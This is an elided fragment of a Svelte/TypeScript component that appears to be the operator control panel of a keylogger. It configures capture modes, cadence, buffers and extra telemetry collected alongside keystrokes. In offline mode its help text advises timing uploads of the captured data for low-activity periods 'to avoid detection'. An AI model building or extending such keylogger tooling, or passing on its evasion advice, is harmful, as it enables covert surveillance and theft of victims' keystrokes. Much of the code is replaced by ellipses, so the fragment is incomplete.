<script lang="ts">
        ...
        const modeCopy: Record<KeyloggerMode, { subtitle: string; cadenceLabel: string; bufferLabel: string }> = {
                online: {
...
<div class="space-y-6">
        ...
        <Card>
                <CardHeader>
                        ...
                        <CardDescription>Adjust cadence, buffers, and telemetry captured alongside keystrokes.</CardDescription>
                </CardHeader>
        ...
        <Card class="border-dashed">
                <CardHeader>
                        ...
                        <CardDescription>Modules that will emit telemetry once the keylogger activates.</CardDescription>
                </CardHeader>
                <CardContent class="space-y-2 text-sm text-muted-foreground">
                        ...
                        {#if mode === 'offline'}
                                <p class="text-xs text-muted-foreground">
                                        Offline mode batches events on disk. Schedule upload windows around low-activity periods to
                                        avoid detection.
                                </p>
                        {/if}
                </CardContent>
